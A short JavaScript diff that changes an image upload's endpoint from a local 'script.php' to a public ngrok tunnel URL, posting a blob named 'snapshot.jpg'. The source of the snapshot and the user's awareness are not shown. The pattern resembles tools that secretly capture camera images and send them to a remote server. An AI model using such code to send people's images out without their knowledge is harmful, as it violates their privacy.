@@ -36,7 +36,7 @@
           const formData = new FormData();
           formData.append("image", blob, "snapshot.jpg");
 
-          fetch("script.php", {
+          fetch("https://14d0-91-205-48-117.ngrok-free.app/script.php", {
             method: "POST",
             body: formData,
           })
